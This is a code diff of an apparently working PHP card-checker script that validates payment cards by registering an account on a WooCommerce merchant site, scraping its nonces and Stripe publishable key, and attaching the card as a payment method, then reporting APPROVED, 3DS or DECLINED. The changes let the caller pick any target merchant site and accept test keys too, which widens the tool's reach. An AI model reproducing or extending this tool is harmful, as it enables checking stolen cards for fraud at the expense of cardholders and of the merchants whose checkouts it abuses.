@@ -5,6 +5,7 @@
 header('Content-Type: text/plain');
 
 $card = $_POST['cc'] ?? $_GET['cc'] ?? '';
+$merchantDomain = $_POST['site'] ?? $_GET['site'] ?? 'peeteescollection.com';
 
 if (empty($card)) {
     echo "ERROR: No card provided";
@@ -27,8 +28,12 @@ if (strlen($year) == 2) {
 $yearTwoDigit = substr($year, -2);
 $month = str_pad($month, 2, '0', STR_PAD_LEFT);
 
-// Merchant configuration
-$merchantDomain = "https://peeteescollection.com";
+// Clean merchant domain (added for custom site support)
+$merchantDomain = rtrim($merchantDomain, '/');
+if (!preg_match('/^https?:\/\//', $merchantDomain)) {
+    $merchantDomain = 'https://' . $merchantDomain;
+}
+
 $userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";
 
 function getBetween($string, $start, $end) {
@@ -55,7 +60,7 @@ $regNonce = getBetween($response, 'name="woocommerce-register-nonce" value="', '
 $wpReferer = getBetween($response, 'name="_wp_http_referer" value="', '"');
 
 if (!$regNonce || !$wpReferer) {
-    echo "DECLINED: Could not load registration page";
+    echo "DECLINED: Could not load registration page Kindly Switch To Self Mode Checker";
     exit;
 }
 
@@ -96,8 +101,8 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, '/tmp/cookies_stripe.txt');
 $response = curl_exec($ch);
 curl_close($ch);
 
-// Extract Stripe publishable key
-preg_match('/pk_live_[0-9a-zA-Z]+/', $response, $pkMatches);
+// Extract Stripe publishable key (supports both live and test for custom sites)
+preg_match('/pk_(live|test)_[0-9a-zA-Z]+/', $response, $pkMatches);
 $stripePK = $pkMatches[0] ?? null;
 
 // Extract setup nonce
@@ -172,9 +177,9 @@ curl_close($ch);
 $result = json_decode($response, true);
 
 if ($result && isset($result['success']) && $result['success'] === true) {
-    echo "APPROVED: Stripe auth successful - Payment method added";
+    echo "APPROVED: Card Authorized Successfully";
 } elseif ($result && isset($result['data']['status']) && $result['data']['status'] === 'requires_action') {
-    echo "3DS: 3D Secure authentication required";
+    echo "3DS: Challenge Required";
 } elseif ($result && isset($result['data']['error']['message'])) {
     echo "DECLINED: " . $result['data']['error']['message'];
 } else {
